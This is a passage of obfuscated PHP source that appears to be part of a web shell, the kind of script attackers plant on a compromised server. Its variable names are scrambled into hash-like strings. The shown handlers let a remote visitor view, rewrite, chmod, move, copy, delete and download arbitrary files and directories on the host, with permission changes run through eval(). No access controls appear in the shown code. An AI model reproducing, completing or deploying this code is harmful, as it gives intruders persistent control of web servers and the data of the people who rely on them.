									if (!@preg_match("/^[A-Fa-f0-9]{32}$/", $_55b73f20aeec06c5111b6ba95bf29532))
										{
											$_55b73f20aeec06c5111b6ba95bf29532 = "Not Available";
										};
									$this->out("<td>" . $this->make_link("file", array("act" => "edit", "name" => $_f3f7e9f4a6ad2cc07b147484d501377d), "[edit]") . ' - ' . $this->make_link("file", array("act" => "delete", "name" => $_f3f7e9f4a6ad2cc07b147484d501377d), "[delete]") . ' - ' . $this->make_link("file", array("act" => "view", "name" => $_f3f7e9f4a6ad2cc07b147484d501377d), "[view]") . ' - <a href="' . $this->make_link("file", array("act" => "download", "name" => $_f3f7e9f4a6ad2cc07b147484d501377d), NULL, TRUE) . '" target="_blank">[download]</a> - <a href="javascript:;" onclick=\'itemShowHide("list_md5_file_' . $_8501d6dd59b45b2159f1f73f6e17b11f . '","button_md5_file_' . $_8501d6dd59b45b2159f1f73f6e17b11f . '");\' title=\'' . $_55b73f20aeec06c5111b6ba95bf29532 . '\'>[MD5]</a><a id="button_md5_file_' . $_8501d6dd59b45b2159f1f73f6e17b11f . '" href="javascript:;" onclick=\'itemShowHide("list_md5_file_' . $_8501d6dd59b45b2159f1f73f6e17b11f . '","button_md5_file_' . $_8501d6dd59b45b2159f1f73f6e17b11f . '");\'>[+]</a><div id="list_md5_file_' . $_8501d6dd59b45b2159f1f73f6e17b11f . '" style=\'display: none;\'><b>MD5 Hash: </b>' . $_55b73f20aeec06c5111b6ba95bf29532 . '</div>' .  "</td>");
									$this->out("</tr>");
								}
							$this->out("</table>");
						break;
						case "file":
						$_2e5c25529adea7d7ad4802936aee0b48 = $_ec4ae32bf3e3a09bae7ff3e84ebbc667['act'];
						$_d3befca3813d65aff84c2353e705a0dd = $_ec4ae32bf3e3a09bae7ff3e84ebbc667['name'];
						if (empty($_2e5c25529adea7d7ad4802936aee0b48))
							{
								$this->out("<center><b>Error: no act was specified</b></center>");
								return FALSE;
							};
												if ($_2e5c25529adea7d7ad4802936aee0b48 == "view")
							{
								if (!@is_file($_d3befca3813d65aff84c2353e705a0dd) || !@is_readable($_d3befca3813d65aff84c2353e705a0dd))
									{
										$this->out("<center><b>Error: the file does not exist or could not be read from.</b></center>");
										return FALSE;
									};
								$_4894710f990f9bda9ef69a94d3de9a25['basename'] = @basename($_d3befca3813d65aff84c2353e705a0dd);
								$_4894710f990f9bda9ef69a94d3de9a25['path'] = @pathinfo($_d3befca3813d65aff84c2353e705a0dd);
								$_4894710f990f9bda9ef69a94d3de9a25['path'] = processdir($_4894710f990f9bda9ef69a94d3de9a25['path']['dirname']) . $_4894710f990f9bda9ef69a94d3de9a25['basename'];
								$_4894710f990f9bda9ef69a94d3de9a25['size'] = view_size(@filesize($_d3befca3813d65aff84c2353e705a0dd));
								$_4894710f990f9bda9ef69a94d3de9a25['md5'] = @md5_file($_d3befca3813d65aff84c2353e705a0dd);
								$_d2f5e3cb12e93bae6c4981faf06db693 = @posix_getpwuid(@fileowner($_d3befca3813d65aff84c2353e705a0dd));
								$_048403d36ad14f408d11cb9c81b09d29 = @posix_getgrgid(@filegroup($_d3befca3813d65aff84c2353e705a0dd));
								$_d2f5e3cb12e93bae6c4981faf06db693 = $_d2f5e3cb12e93bae6c4981faf06db693["name"];
								$_048403d36ad14f408d11cb9c81b09d29 = $_048403d36ad14f408d11cb9c81b09d29["name"];
								$_4894710f990f9bda9ef69a94d3de9a25['owner_group'] = "$_d2f5e3cb12e93bae6c4981faf06db693|$_048403d36ad14f408d11cb9c81b09d29";
								$_4894710f990f9bda9ef69a94d3de9a25['permissions'] = view_perms_color($_d3befca3813d65aff84c2353e705a0dd);
								$_4894710f990f9bda9ef69a94d3de9a25['modified'] = @date ("F d Y H:i:s.", @filemtime($_d3befca3813d65aff84c2353e705a0dd));
								$_4894710f990f9bda9ef69a94d3de9a25['created'] = @date ("F d Y H:i:s.", @filectime($_d3befca3813d65aff84c2353e705a0dd));
								$_4894710f990f9bda9ef69a94d3de9a25['accessed'] = @date ("F d Y H:i:s.", @fileatime($_d3befca3813d65aff84c2353e705a0dd));
								$this->out('<table width=100% border="1" cellpadding="0" cellspacing="0" bordercolor="#000000">
	<tr>
		<td>
			<center>
			  <strong><font color=green>' . $_4894710f990f9bda9ef69a94d3de9a25['basename'] . '</font></strong>
			</center>
		</td>
	</tr>
	<tr>
		<td>
			<table width=100%>
				<tr>
					<td valign="top" width=70%>
						<div align="center"><strong>File Information </strong></div>
						<table width=100%>
							<tr>
								<td>
									Path: <b>' . $_4894710f990f9bda9ef69a94d3de9a25['path'] . '</b>
								</td>
							</tr>
							<tr>
								<td>
									Size: <b>' . $_4894710f990f9bda9ef69a94d3de9a25['size'] . '</b>
								</td>
							</tr>
							<tr>
								<td>
									MD5: <b>' . $_4894710f990f9bda9ef69a94d3de9a25['md5'] . '</b>
								</td>
							</tr>
							<tr>
								<td>
									Owner|Group: <b>' . $_4894710f990f9bda9ef69a94d3de9a25['owner_group'] . '</b>
								</td>
							</tr>
							<tr>
								<td>
									Permissions: <b>' . $this->make_link("file", array("act" => "chmod", "name" => $_d3befca3813d65aff84c2353e705a0dd), $_4894710f990f9bda9ef69a94d3de9a25['permissions']) . '</b>
								</td>
							</tr>
							<tr>
								<td>
								Creation: <strong>' . $_4894710f990f9bda9ef69a94d3de9a25['created'] . '</strong>								</td>
							</tr>
							<tr>
								<td>
								Modification: <strong>' . $_4894710f990f9bda9ef69a94d3de9a25['modified'] . '</strong>								</td>
							</tr>
							<tr>
								<td>
								Access: <strong>' . $_4894710f990f9bda9ef69a94d3de9a25['accessed'] . '</strong>								</td>
							</tr>
						</table>
				  </td>
				  <td valign="top">
						<div align="center"><strong>File Actions</strong></div>
						<table width=100%>
							<tr>
								<td>
									<strong>
										' . $this->make_link("file", array("act" => "edit", "name" => $_d3befca3813d65aff84c2353e705a0dd), "[edit]") . '
									</strong>
								</td>
							</tr>
							<tr>
								<td><strong>' . $this->make_link("file", array("act" => "chmod", "name" => $_d3befca3813d65aff84c2353e705a0dd), "[chmod]") . '</strong></td>
							</tr>
							<tr>
								<td>
									<strong>' . $this->make_link("file", array("act" => "move", "name" => $_d3befca3813d65aff84c2353e705a0dd), "[move]") . '</strong>
								</td>
							</tr>
							<tr>
								<td>
									<strong>' . $this->make_link("file", array("act" => "copy", "name" => $_d3befca3813d65aff84c2353e705a0dd), "[copy]") . '</strong>
								</td>
							</tr>
							<tr>
								<td>
									<strong>' . $this->make_link("file", array("act" => "delete", "name" => $_d3befca3813d65aff84c2353e705a0dd), "[delete]") . '</strong>
								</td>
							</tr>
							<tr>
								<td>
									<strong><a href="' . $this->make_link("file", array("act" => "download", "name" => $_d3befca3813d65aff84c2353e705a0dd), NULL, TRUE) . '" target="_blank">[download]</a></strong>
								</td>
							</tr>
						</table>
				  </td>
				</tr>
			</table>
		</td>
	</tr>
</table>');
							}
						elseif ($_2e5c25529adea7d7ad4802936aee0b48 == "chmod")
							{
								if (!@is_file($_d3befca3813d65aff84c2353e705a0dd))
									{
										$this->out("<center><b>Error: the file does not exist or could not be read from.</b></center>");
										return FALSE;
									};
								$_4efbfa502ea6e58b84de1cdc04aecadf = $_POST['newmode'];
								if (empty($_4efbfa502ea6e58b84de1cdc04aecadf))
									{
										$_2211b5dc6bb7947adcb0bf14cee6591e = @pathinfo($_d3befca3813d65aff84c2353e705a0dd);
										$_2211b5dc6bb7947adcb0bf14cee6591e = $_2211b5dc6bb7947adcb0bf14cee6591e['dirname'];
										$_9074596a8e59a87e41db87f3029b4959 = @basename($_d3befca3813d65aff84c2353e705a0dd);
										$_13f531c0ca48f6a5f8315121bf59ffaa = file_perms($_d3befca3813d65aff84c2353e705a0dd, TRUE);
										$this->out("Changing file permissions of <b>" . processdir($_2211b5dc6bb7947adcb0bf14cee6591e) . $this->make_link("file", array("act" => "view", "name" => $_d3befca3813d65aff84c2353e705a0dd), $_9074596a8e59a87e41db87f3029b4959) . "</b>, " . view_perms_color($_d3befca3813d65aff84c2353e705a0dd) . " (".substr(decoct(fileperms($_d3befca3813d65aff84c2353e705a0dd)),-4,4).")<br>" . '<form method="post" action="' . $this->make_link("file", array("act" => "chmod", "name" => $_d3befca3813d65aff84c2353e705a0dd), NULL, TRUE) . '"><input name="newmode" type="text" value="' . $_13f531c0ca48f6a5f8315121bf59ffaa . '" size="4" maxlength="4"><br><input type="submit" name="Submit" value="Set"></form>'); 
									}
								else
									{
										$_4efbfa502ea6e58b84de1cdc04aecadf = @intval($_4efbfa502ea6e58b84de1cdc04aecadf);
										$_d3befca3813d65aff84c2353e705a0dd = @base64_encode($_d3befca3813d65aff84c2353e705a0dd);
										$_16d3c4cdd343a37db4994c3591c83993 = "chmod (base64_decode('" . $_d3befca3813d65aff84c2353e705a0dd . "'), 0" . $_4efbfa502ea6e58b84de1cdc04aecadf . ");";
										if (eval($_16d3c4cdd343a37db4994c3591c83993) === FALSE)
											{
												$_d3befca3813d65aff84c2353e705a0dd = @base64_decode($_d3befca3813d65aff84c2353e705a0dd);
												$this->out("<center><b>Failed to change permissions of file. " . $this->make_link("file", array("name" => $_d3befca3813d65aff84c2353e705a0dd, "act" => "view"), " Click here to go back to file.") . "</b></center>");
											}
										else
											{
												@clearstatcache();
												$_d3befca3813d65aff84c2353e705a0dd = @base64_decode($_d3befca3813d65aff84c2353e705a0dd);
												$_2211b5dc6bb7947adcb0bf14cee6591e = @pathinfo($_d3befca3813d65aff84c2353e705a0dd);
												$_2211b5dc6bb7947adcb0bf14cee6591e = $_2211b5dc6bb7947adcb0bf14cee6591e['dirname'];
												$_9074596a8e59a87e41db87f3029b4959 = basename($_d3befca3813d65aff84c2353e705a0dd);
												$_13f531c0ca48f6a5f8315121bf59ffaa = file_perms($_d3befca3813d65aff84c2353e705a0dd, TRUE);
												$this->out("Changing file permissions of <b>" . processdir($_2211b5dc6bb7947adcb0bf14cee6591e) . $this->make_link("file", array("act" => "view", "name" => $_d3befca3813d65aff84c2353e705a0dd), $_9074596a8e59a87e41db87f3029b4959) . "</b>, " . view_perms_color($_d3befca3813d65aff84c2353e705a0dd) . " (".substr(decoct(fileperms($_d3befca3813d65aff84c2353e705a0dd)),-4,4).")<br>" . '<form method="post" action="' . $this->make_link("file", array("act" => "chmod", "name" => $_d3befca3813d65aff84c2353e705a0dd), NULL, TRUE) . '"><input name="newmode" type="text" value="' . $_13f531c0ca48f6a5f8315121bf59ffaa . '" size="4" maxlength="4"><br><input type="submit" name="Submit" value="Set"></form>'); 
											};
									};
							}
						elseif ($_2e5c25529adea7d7ad4802936aee0b48 == "edit")
							{
								$this->out("<table width=100%><tr><!-- <td><a id='sqlconnectbox' href='javascript:;' onclick='itemShowHide(\"sqlconnectbox_div\", \"sqlconnectbox\")'>[+]</a><br><div id='sqlconnectbox_div' style='display: none;'>{SQL Connection Interfase}</div></td> !--><td>");
								if (!@is_file($_d3befca3813d65aff84c2353e705a0dd) || !@is_readable($_d3befca3813d65aff84c2353e705a0dd))
									{
										$this->out("<center><b>Error: the file does not exist or could not be read from.</b></center>");
										return FALSE;
									};
								if (!isset($_POST['newdata']))
									{
										$_2211b5dc6bb7947adcb0bf14cee6591e = @pathinfo($_d3befca3813d65aff84c2353e705a0dd);
										$_2211b5dc6bb7947adcb0bf14cee6591e = $_2211b5dc6bb7947adcb0bf14cee6591e['dirname'];
										$_9074596a8e59a87e41db87f3029b4959 = @basename($_d3befca3813d65aff84c2353e705a0dd);
										$this->out("Editing file <b>" . processdir($_2211b5dc6bb7947adcb0bf14cee6591e) . $this->make_link("file", array("act" => "view", "name" => $_d3befca3813d65aff84c2353e705a0dd), $_9074596a8e59a87e41db87f3029b4959) . "</b><br>" . '<form method="post" action="' . $this->make_link("file", array("act" => "edit", "name" => $_d3befca3813d65aff84c2353e705a0dd), NULL, TRUE) . '" enctype="multipart/form-data"><textarea id="newdata" name="newdata" rows="20" style="width:100%;">' . @htmlspecialchars(@implode("", @file($_d3befca3813d65aff84c2353e705a0dd))) . '</textarea><input type="submit" value="Save"><input type="reset" value="Reset"></form>');
									}
								else
									{
										$_4aac6af23de22a66b42d8ba63e7fc9fe = $_POST['newdata'];
										$_4aac6af23de22a66b42d8ba63e7fc9fe = @stripslashes($_4aac6af23de22a66b42d8ba63e7fc9fe);
										$_c14f19c15d50e72a5733c0ad88a035b9 = @fopen($_d3befca3813d65aff84c2353e705a0dd, "w");
										@fwrite($_c14f19c15d50e72a5733c0ad88a035b9, $_4aac6af23de22a66b42d8ba63e7fc9fe);
										@fclose($_c14f19c15d50e72a5733c0ad88a035b9);
										$_2211b5dc6bb7947adcb0bf14cee6591e = @pathinfo($_d3befca3813d65aff84c2353e705a0dd);
										$_2211b5dc6bb7947adcb0bf14cee6591e = $_2211b5dc6bb7947adcb0bf14cee6591e['dirname'];
										$_9074596a8e59a87e41db87f3029b4959 = @basename($_d3befca3813d65aff84c2353e705a0dd);
										$this->out("Editing file <b>" . processdir($_2211b5dc6bb7947adcb0bf14cee6591e) . $this->make_link("file", array("act" => "view", "name" => $_d3befca3813d65aff84c2353e705a0dd), $_9074596a8e59a87e41db87f3029b4959) . "</b><br>" . '<b>Success!</b><br><form method="post" action="' . $this->make_link("file", array("act" => "edit", "name" => $_d3befca3813d65aff84c2353e705a0dd), NULL, TRUE) . '" enctype="multipart/form-data"><textarea id="newdata" name="newdata" rows="20" style="width:100%;">' . @htmlspecialchars(@implode("", @file($_d3befca3813d65aff84c2353e705a0dd))) . '</textarea><input type="submit" value="Save"><input type="reset" value="Reset"></form>');
									};
								$this->out("</td></tr></table>");
							}
						elseif ($_2e5c25529adea7d7ad4802936aee0b48 == "move")
							{
								$_d0b3e9370ba342bbae976cec71233e51 = $_POST['moveto'];
								$_2211b5dc6bb7947adcb0bf14cee6591e = @pathinfo($_d3befca3813d65aff84c2353e705a0dd);
								$_9074596a8e59a87e41db87f3029b4959 = @basename($_d3befca3813d65aff84c2353e705a0dd);
								$_2211b5dc6bb7947adcb0bf14cee6591e = $_2211b5dc6bb7947adcb0bf14cee6591e['dirname'];
								if (!isset($_POST['moveto']))
									{
										$this->out("Preparing to move file <b>" . processdir($_2211b5dc6bb7947adcb0bf14cee6591e) . $this->make_link("file", array("act" => "view", "name" => $_d3befca3813d65aff84c2353e705a0dd), $_9074596a8e59a87e41db87f3029b4959) . "</b><br>" . '<form action="' . $this->make_link("file", array("act" => "move", "name" => $_d3befca3813d65aff84c2353e705a0dd), NULL, TRUE) . '" method="post"><input name="moveto" type="text" id="moveto" style="width:80%;" size="50" value="' . @htmlspecialchars($_d3befca3813d65aff84c2353e705a0dd) . '"><br><input type="submit" value="Move"></form>');
									}
								else
									{
										$_d0b3e9370ba342bbae976cec71233e51 = @htmlspecialchars_decode($_d0b3e9370ba342bbae976cec71233e51);
										if (!@rename($_d3befca3813d65aff84c2353e705a0dd, $_d0b3e9370ba342bbae976cec71233e51))
											{
												$this->out("Preparing to move file <b>" . processdir($_2211b5dc6bb7947adcb0bf14cee6591e) . $this->make_link("file", array("act" => "view", "name" => $_d3befca3813d65aff84c2353e705a0dd), $_9074596a8e59a87e41db87f3029b4959) . "</b><br><b>Failed!</b><br>" . '<form action="' . $this->make_link("file", array("act" => "move", "name" => $_d3befca3813d65aff84c2353e705a0dd), NULL, TRUE) . '" method="post"><input name="moveto" type="text" id="moveto" style="width:80%;" size="50" value="' . @htmlspecialchars($_d3befca3813d65aff84c2353e705a0dd) . '"><br><input type="submit" value="Move"></form>');
											}
										else
											{
												$_2211b5dc6bb7947adcb0bf14cee6591e = $_d0b3e9370ba342bbae976cec71233e51;
												$_2211b5dc6bb7947adcb0bf14cee6591e = @pathinfo($_2211b5dc6bb7947adcb0bf14cee6591e);
												$_2211b5dc6bb7947adcb0bf14cee6591e = $_2211b5dc6bb7947adcb0bf14cee6591e['dirname'];
												$_9074596a8e59a87e41db87f3029b4959 = @basename($_d0b3e9370ba342bbae976cec71233e51);
												$this->out("Preparing to move file <b>" . processdir($_2211b5dc6bb7947adcb0bf14cee6591e) . $this->make_link("file", array("act" => "view", "name" => $_d0b3e9370ba342bbae976cec71233e51), $_9074596a8e59a87e41db87f3029b4959) . "</b><br><b>Success!</b><br>" . '<form action="' . $this->make_link("file", array("act" => "move", "name" => $_d3befca3813d65aff84c2353e705a0dd), NULL, TRUE) . '" method="post" enctype="text/plain"><input name="moveto" type="text" id="moveto" style="width:80%;" size="50" value="' . @htmlspecialchars($_d0b3e9370ba342bbae976cec71233e51) . '"><br><input type="submit" value="Move"></form>');
											};
									};
							}
						elseif ($_2e5c25529adea7d7ad4802936aee0b48 == "copy")
							{
								$_d4328d5d2bbd5a7a94ae0b56d6e6aade = $_POST['copyto'];
								$_2211b5dc6bb7947adcb0bf14cee6591e = @pathinfo($_d3befca3813d65aff84c2353e705a0dd);
								$_9074596a8e59a87e41db87f3029b4959 = @basename($_d3befca3813d65aff84c2353e705a0dd);
								$_2211b5dc6bb7947adcb0bf14cee6591e = $_2211b5dc6bb7947adcb0bf14cee6591e['dirname'];
								if (!isset($_POST['copyto']))
									{
										$this->out("Preparing to copy file <b>" . processdir($_2211b5dc6bb7947adcb0bf14cee6591e) . $this->make_link("file", array("act" => "view", "name" => $_d3befca3813d65aff84c2353e705a0dd), $_9074596a8e59a87e41db87f3029b4959) . "</b><br>" . '<form action="' . $this->make_link("file", array("act" => "copy", "name" => $_d3befca3813d65aff84c2353e705a0dd), NULL, TRUE) . '" method="post"><input name="copyto" type="text" id="copyto" style="width:80%;" size="50" value="' . @htmlspecialchars($_d3befca3813d65aff84c2353e705a0dd) . '"><br><input type="submit" value="Copy"></form>');
									}
								else
									{
										$_d4328d5d2bbd5a7a94ae0b56d6e6aade = @htmlspecialchars_decode($_d4328d5d2bbd5a7a94ae0b56d6e6aade);
										if (!@copy($_d3befca3813d65aff84c2353e705a0dd, $_d4328d5d2bbd5a7a94ae0b56d6e6aade))
											{
												$this->out("Preparing to copy file <b>" . processdir($_2211b5dc6bb7947adcb0bf14cee6591e) . $this->make_link("file", array("act" => "view", "name" => $_d3befca3813d65aff84c2353e705a0dd), $_9074596a8e59a87e41db87f3029b4959) . "</b><br><b>Failed!</b><br>" . '<form action="' . $this->make_link("file", array("act" => "copy", "name" => $_d3befca3813d65aff84c2353e705a0dd), NULL, TRUE) . '" method="post"><input name="copyto" type="text" id="copyto" style="width:80%;" size="50" value="' . @htmlspecialchars($_d3befca3813d65aff84c2353e705a0dd) . '"><br><input type="submit" value="Copy"></form>');
											}
										else
											{
												$this->out("Preparing to copy file <b>" . processdir($_2211b5dc6bb7947adcb0bf14cee6591e) . $this->make_link("file", array("act" => "view", "name" => $_d3befca3813d65aff84c2353e705a0dd), $_9074596a8e59a87e41db87f3029b4959) . "</b><br><b>Success!</b><br>" . '<form action="' . $this->make_link("file", array("act" => "copy", "name" => $_d3befca3813d65aff84c2353e705a0dd), NULL, TRUE) . '" method="post"><input name="copyto" type="text" id="copyto" style="width:80%;" size="50" value="' . @htmlspecialchars($_d3befca3813d65aff84c2353e705a0dd) . '"><br><input type="submit" value="Copy"></form>');
											};
									};
							}
						elseif ($_2e5c25529adea7d7ad4802936aee0b48 == "delete")
							{
								$_2a46f3328eaed89ef8402d4effba331e = $_POST['confirm_delete'];
								if (!isset($_POST['confirm_delete']))
									{
										$_2211b5dc6bb7947adcb0bf14cee6591e = @pathinfo($_d3befca3813d65aff84c2353e705a0dd);
										$_9074596a8e59a87e41db87f3029b4959 = @basename($_d3befca3813d65aff84c2353e705a0dd);
										$_2211b5dc6bb7947adcb0bf14cee6591e = $_2211b5dc6bb7947adcb0bf14cee6591e['dirname'];
										$this->out("Are you sure you wish to delete file <b>" . processdir($_2211b5dc6bb7947adcb0bf14cee6591e) . $this->make_link("file", array("act" => "view", "name" => $_d3befca3813d65aff84c2353e705a0dd), $_9074596a8e59a87e41db87f3029b4959) . "</b><br>" . '<form action="' . $this->make_link("file", array("act" => "delete", "name" => $_d3befca3813d65aff84c2353e705a0dd), NULL, TRUE) . '" method="post"><input name="confirm_delete" type="hidden" id="confirm_delete" value="YES"><input type="submit" value="Delete file"></form>');
									}
								else
									{
										$_2211b5dc6bb7947adcb0bf14cee6591e = @pathinfo($_d3befca3813d65aff84c2353e705a0dd);
										$_9074596a8e59a87e41db87f3029b4959 = @basename($_d3befca3813d65aff84c2353e705a0dd);
										$_2211b5dc6bb7947adcb0bf14cee6591e = $_2211b5dc6bb7947adcb0bf14cee6591e['dirname'];
										if (!@unlink($_d3befca3813d65aff84c2353e705a0dd))
											{
												$this->out("Are you sure you wish to delete file <b>" . processdir($_2211b5dc6bb7947adcb0bf14cee6591e) . $this->make_link("file", array("act" => "view", "name" => $_d3befca3813d65aff84c2353e705a0dd), $_9074596a8e59a87e41db87f3029b4959) . "</b><br><b>Failed!</b><br>" . '<form action="' . $this->make_link("file", array("act" => "delete", "name" => $_d3befca3813d65aff84c2353e705a0dd), NULL, TRUE) . '" method="post"><input name="confirm_delete" type="hidden" id="confirm_delete" value="YES"><input type="submit" value="Delete file"></form>');
											}
										else
											{
												$this->out("<b>File Deleted.</b><br>" . $this->make_link("list", array("name" => $_2211b5dc6bb7947adcb0bf14cee6591e), "Click here to go back."));
											};
									}
							}
						elseif ($_2e5c25529adea7d7ad4802936aee0b48 == "download")
							{
								if (!@is_file($_d3befca3813d65aff84c2353e705a0dd) || !@is_readable($_d3befca3813d65aff84c2353e705a0dd))
									{
										if (@is_file($_d3befca3813d65aff84c2353e705a0dd))
											{
												$_2211b5dc6bb7947adcb0bf14cee6591e = @pathinfo($_d3befca3813d65aff84c2353e705a0dd);
												$_2211b5dc6bb7947adcb0bf14cee6591e = $_2211b5dc6bb7947adcb0bf14cee6591e['dirname'];
											}
										else
											{
												$_2211b5dc6bb7947adcb0bf14cee6591e = "";
											};
										$this->out("Could not download file.<br>" . $this->make_link("list", array("name" => $_2211b5dc6bb7947adcb0bf14cee6591e), "Click here to go back."));
									}
								@header("Cache-Control: public, must-revalidate");
								@header("Content-Type: application/octet-stream");
								@header("Content-Length: " . (string)filesize($_d3befca3813d65aff84c2353e705a0dd));
								@header('Content-Disposition: attachment; filename="'.basename($_d3befca3813d65aff84c2353e705a0dd).'"');
								@header("Content-Transfer-Encoding: binary");
								@readfile($_d3befca3813d65aff84c2353e705a0dd);
								exit;
							}
						else
							{
								$this->process("file", array("name" => $_d3befca3813d65aff84c2353e705a0dd, "act" => "view"));
								return FALSE;
							};
						break;
						case "dir":
							$_2e5c25529adea7d7ad4802936aee0b48 = $_ec4ae32bf3e3a09bae7ff3e84ebbc667['act'];
							$_d3befca3813d65aff84c2353e705a0dd = $_ec4ae32bf3e3a09bae7ff3e84ebbc667['name'];
							if (empty($_2e5c25529adea7d7ad4802936aee0b48))
								{
									$this->out("<center><b>Error: no act was specified</b></center>");
									return FALSE;
								};
														if ($_2e5c25529adea7d7ad4802936aee0b48 == "info")
								{
									if ((@is_dir($_d3befca3813d65aff84c2353e705a0dd)) && (@is_readable($_d3befca3813d65aff84c2353e705a0dd . DIRECTORY_SEPARATOR)))
										{
											$_d69e2bdf98584fc6cce9c9f9a9eb8b6a = listDir($_d3befca3813d65aff84c2353e705a0dd . DIRECTORY_SEPARATOR);
											$this->out('<table width=100% border="1" cellpadding="0" cellspacing="0" bordercolor="#000000">
								<tr>
									<td>
										<center>
										  <strong><font color=green>' . processdir($_d3befca3813d65aff84c2353e705a0dd) . '</font></strong>
										</center>
									</td>
								</tr>
								<tr>
									<td>
										<table width=100%>
											<tr>
												<td valign="top" width=70%>
													<div align="center"><strong>Directory Information</strong></div>
													<table width=100%>
														<tr>
															<td>
																Files: ' . @count($_d69e2bdf98584fc6cce9c9f9a9eb8b6a['FILES']) . '
															</td>
														</tr>
														<tr>
															<td>
																Subdirectories: ' . @count($_d69e2bdf98584fc6cce9c9f9a9eb8b6a['DIRS']) . '
															</td>
														</tr>
													</table>
											  </td>
											  <td valign="top">
													<div align="center"><strong>Directory Actions</strong></div>
													<table width=100%>
														<tr>
															<td>
																<strong>
																	' . $this->make_link("dir", array("act" => "chmod", "name" => $_d3befca3813d65aff84c2353e705a0dd), "[chmod]") . '
																</strong>
															</td>
														</tr>
														<tr>
															<td>
																<strong>
																	' . $this->make_link("dir", array("act" => "move", "name" => $_d3befca3813d65aff84c2353e705a0dd), "[move]") . '
																</strong>
															</td>
														</tr>
														<tr>
															<td>
																<strong>
																	' . $this->make_link("dir", array("act" => "delete", "name" => $_d3befca3813d65aff84c2353e705a0dd), "[delete]") . '
																</strong>
															</td>
														</tr>
													</table>
											  </td>
											</tr>
										</table>
									</td>
								</tr>
							</table>');
										}
									else
										{
											$this->out("<center><b>Directory is invalid.</b></center>");
										};
								}
							elseif ($_2e5c25529adea7d7ad4802936aee0b48 == "chmod")
								{
									if (!@is_dir($_d3befca3813d65aff84c2353e705a0dd))
										{
											$this->out("<center><b>Error: the directory does not exist or could not be read from.</b></center>");
											return FALSE;
										};
									$_4efbfa502ea6e58b84de1cdc04aecadf = $_POST['newmode'];
									$_13f531c0ca48f6a5f8315121bf59ffaa = file_perms($_d3befca3813d65aff84c2353e705a0dd, TRUE);
									if (empty($_4efbfa502ea6e58b84de1cdc04aecadf))
										{
											$_2211b5dc6bb7947adcb0bf14cee6591e = $_d3befca3813d65aff84c2353e705a0dd;
											$this->out("Changing file permissions of <b>" . processdir($_2211b5dc6bb7947adcb0bf14cee6591e) . "</b>, " . view_perms_color($_d3befca3813d65aff84c2353e705a0dd) . " (".@substr(@decoct(@fileperms($_d3befca3813d65aff84c2353e705a0dd)),-4,4).")<br>" . '<form method="post" action="' . $this->make_link("dir", array("act" => "chmod", "name" => $_d3befca3813d65aff84c2353e705a0dd), NULL, TRUE) . '"><input name="newmode" type="text" value="0' . $_13f531c0ca48f6a5f8315121bf59ffaa . '" size="4" maxlength="4"><br><input type="submit" name="Submit" value="Set"></form>'); 
										}
									else
										{
											$_4efbfa502ea6e58b84de1cdc04aecadf = @intval($_4efbfa502ea6e58b84de1cdc04aecadf);
											$_d3befca3813d65aff84c2353e705a0dd = @base64_encode($_d3befca3813d65aff84c2353e705a0dd);
											$_16d3c4cdd343a37db4994c3591c83993 = "chmod (base64_decode('$_d3befca3813d65aff84c2353e705a0dd'), 0$_4efbfa502ea6e58b84de1cdc04aecadf);";
											if (eval($_16d3c4cdd343a37db4994c3591c83993) === FALSE)
												{
													$_d3befca3813d65aff84c2353e705a0dd = base64_decode($_d3befca3813d65aff84c2353e705a0dd);
													$this->out("<center><b>Failed to change permissions of the directory. " . $this->make_link("file", array("dir" => $_d3befca3813d65aff84c2353e705a0dd, "act" => "view"), " Click here to go back to the directory.") . "</b></center>");
												}
											else
												{
													@clearstatcache();
													$_d3befca3813d65aff84c2353e705a0dd = @base64_decode($_d3befca3813d65aff84c2353e705a0dd);
													$_2211b5dc6bb7947adcb0bf14cee6591e = @pathinfo($_d3befca3813d65aff84c2353e705a0dd);
													$_2211b5dc6bb7947adcb0bf14cee6591e = $_2211b5dc6bb7947adcb0bf14cee6591e['dirname'];
													$_9074596a8e59a87e41db87f3029b4959 = @basename($_d3befca3813d65aff84c2353e705a0dd);
													$_13f531c0ca48f6a5f8315121bf59ffaa = file_perms($_d3befca3813d65aff84c2353e705a0dd, TRUE);
													$this->out("Changing file permissions of <b>" . processdir($_2211b5dc6bb7947adcb0bf14cee6591e) . "</b>, " . view_perms_color($_d3befca3813d65aff84c2353e705a0dd) . " (".@substr(@decoct(@fileperms($_d3befca3813d65aff84c2353e705a0dd)),-4,4).")<br>" . '<b>Success!</b><br><form method="post" action="' . $this->make_link("dir", array("act" => "chmod", "name" => $_d3befca3813d65aff84c2353e705a0dd), NULL, TRUE) . '"><input name="newmode" type="text" value="0' . $_13f531c0ca48f6a5f8315121bf59ffaa . '" size="4" maxlength="4"><br><input type="submit" name="Submit" value="Set"></form>'); 
												};
										};
								}
							elseif ($_2e5c25529adea7d7ad4802936aee0b48 == "move")
								{
									$_d0b3e9370ba342bbae976cec71233e51 = $_POST['moveto'];
									$_2211b5dc6bb7947adcb0bf14cee6591e = $_d3befca3813d65aff84c2353e705a0dd;
									if (!isset($_POST['moveto']))
										{
											$this->out("Preparing to move directory <b>" . processdir($_2211b5dc6bb7947adcb0bf14cee6591e) . "</b><br>" . '<form action="' . $this->make_link("dir", array("act" => "move", "name" => $_d3befca3813d65aff84c2353e705a0dd), NULL, TRUE) . '" method="post"><input name="moveto" type="text" id="moveto" style="width:80%;" size="50" value="' . @htmlspecialchars($_d3befca3813d65aff84c2353e705a0dd) . '"><br><input type="submit" value="Move"></form>');
										}
									else
										{
											$_d0b3e9370ba342bbae976cec71233e51 = @htmlspecialchars_decode($_d0b3e9370ba342bbae976cec71233e51);
											if (!@rename($_d3befca3813d65aff84c2353e705a0dd, $_d0b3e9370ba342bbae976cec71233e51))
												{
													$this->out("Preparing to move directory <b>" . processdir($_2211b5dc6bb7947adcb0bf14cee6591e) . "</b><br><b>Failed!</b><br>" . '<form action="' . $this->make_link("dir", array("act" => "move", "name" => $_d3befca3813d65aff84c2353e705a0dd), NULL, TRUE) . '" method="post"><input name="moveto" type="text" id="moveto" style="width:80%;" size="50" value="' . htmlspecialchars($_d3befca3813d65aff84c2353e705a0dd) . '"><br><input type="submit" value="Move"></form>');
												}
											else
												{
													$this->out("Preparing to move directory <b>" . processdir($_d0b3e9370ba342bbae976cec71233e51) . "</b><br><b>Success!</b><br>" . '<form action="' . $this->make_link("dir", array("act" => "move", "name" => $_d0b3e9370ba342bbae976cec71233e51), NULL, TRUE) . '" method="post"><input name="moveto" type="text" id="moveto" style="width:80%;" size="50" value="' . htmlspecialchars($_d0b3e9370ba342bbae976cec71233e51) . '"><br><input type="submit" value="Move"></form>');
												};
										};
								}
